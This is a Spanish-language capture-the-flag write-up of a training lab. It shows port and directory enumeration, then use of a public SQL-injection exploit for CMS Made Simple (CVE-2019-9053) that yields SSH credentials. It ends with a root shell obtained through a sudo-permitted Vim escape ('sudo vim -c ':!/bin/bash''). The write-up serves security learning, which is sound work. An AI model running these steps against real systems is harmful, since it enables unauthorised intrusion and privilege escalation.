# Simple CTF

## 🖥️ Sistema

Linux

---

## 🎯 Objetivo del laboratorio

Comprometer una máquina Linux identificando un **CMS vulnerable**, explotando una **SQL Injection** para obtener credenciales, acceder mediante **SSH** y escalar privilegios aprovechando una configuración insegura de **sudo**.

---

## 🛠️ Tecnologías trabajadas

- CMS Made Simple
- SQL Injection
- CVE-2019-9053
- Gobuster
- SSH
- Sudo
- Vim
- GTFOBins

---

## 🧠 Metodología

La enumeración inicial mostró tres servicios: **FTP**, **HTTP** y **SSH**, aunque este último utilizaba un puerto no estándar. A pesar de que el servidor FTP permitía autenticación anónima, la aplicación web presentaba una mayor superficie de ataque, por lo que decidí centrar la investigación en ella.

La enumeración de directorios permitió descubrir una instalación de **CMS Made Simple**. Una vez identificado el CMS, el siguiente paso consistió en determinar su versión para comprobar si existían vulnerabilidades públicas conocidas. Esta estrategia permitió localizar una **SQL Injection** documentada que facilitaba la obtención de credenciales válidas sin necesidad de realizar ataques de fuerza bruta.

Tras acceder al sistema mediante SSH, la escalada de privilegios fue sencilla gracias a una configuración insegura de **sudo**, que permitía ejecutar **Vim** como **root**. Aprovechando una técnica documentada en GTFOBins fue posible obtener una shell privilegiada y completar el laboratorio.

Este ejercicio pone de manifiesto la importancia de identificar correctamente las tecnologías utilizadas por una aplicación antes de intentar explotarla.

---

## 🚀 Explotación

### 1. Enumeración inicial

Comencé realizando un escaneo completo de puertos con Nmap.

```bash
nmap -p- 10.130.159.45
```

Se identificaron los siguientes servicios:

| Puerto | Servicio |
|---------|----------|
| 21 | FTP |
| 80 | HTTP |
| 2222 | SSH |

Posteriormente realicé una enumeración más detallada.

```bash
nmap -sC -sV -p21,80,2222 10.130.159.45
```

La información obtenida confirmó:

- FTP con acceso **Anonymous**.
- Servidor Apache.
- Servicio SSH ejecutándose en el puerto **2222**.

---

### 2. Enumeración web

La investigación comenzó sobre la aplicación web.

Realicé una enumeración de directorios mediante Gobuster.

```bash
gobuster dir -u http://10.130.159.45 -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt
```

El recurso más interesante encontrado fue:

```
/simple
```

Al acceder identifiqué que la aplicación utilizaba:

```
CMS Made Simple
```

Tras revisar la versión instalada comprobé que se trataba de:

```
2.2.8
```

---

### 3. Explotación del CMS

Conociendo el CMS y su versión, busqué vulnerabilidades públicas asociadas.

Encontré la vulnerabilidad:

```
CVE-2019-9053
```

correspondiente a una **SQL Injection**.

Utilicé el exploit público:

```
46635.py
```

La explotación permitió recuperar las siguientes credenciales:

```
Usuario: mitch

Contraseña: secret
```

---

### 4. Acceso inicial

Con las credenciales obtenidas inicié sesión mediante SSH utilizando el puerto no estándar.

```bash
ssh mitch@10.130.159.45 -p 2222
```

Una vez autenticado recuperé la primera flag:

```
user.txt
```

Durante la enumeración del sistema también identifiqué otro usuario:

```
sunbath
```

---

### 5. Enumeración interna

El siguiente paso consistió en revisar los privilegios disponibles.

Ejecuté:

```bash
sudo -l
```

El resultado mostró que el usuario **mitch** podía ejecutar:

```
/usr/bin/vim
```

como **root** sin necesidad de introducir contraseña.

---

### 6. Escalada de privilegios

Consultando **GTFOBins** comprobé que era posible utilizar **Vim** para ejecutar una shell con privilegios elevados.

Ejecuté:

```bash
sudo vim -c ':!/bin/bash'
```

La técnica permitió obtener una shell como **root**.

Finalmente accedí al directorio:

```
/root
```

y recuperé la última flag del laboratorio.

---

## 📚 Lecciones aprendidas

- Este laboratorio permitió practicar una cadena de explotación muy representativa de auditorías reales sobre aplicaciones web basadas en CMS.
- Identificar correctamente un **CMS** durante la fase de enumeración.
- Comprobar versiones para localizar vulnerabilidades conocidas.
- Buscar CVEs asociadas a un software concreto.
- Explotar una **SQL Injection** para recuperar credenciales.
- Acceder mediante SSH utilizando puertos no estándar.
- Revisar configuraciones inseguras de `sudo`.
- Aprovechar **Vim** para obtener una shell privilegiada mediante GTFOBins.

### Reflexión

La principal enseñanza de este laboratorio fue comprobar que identificar correctamente un CMS puede simplificar enormemente una auditoría. En lugar de buscar vulnerabilidades de forma genérica, conocer el software y su versión permitió localizar rápidamente una **CVE** pública que proporcionó acceso inicial mediante la obtención de credenciales. Además, el laboratorio reforzó la importancia de revisar siempre los permisos disponibles con `sudo -l`, ya que una única aplicación autorizada, como **Vim**, puede ser suficiente para comprometer completamente un sistema cuando está mal configurada.
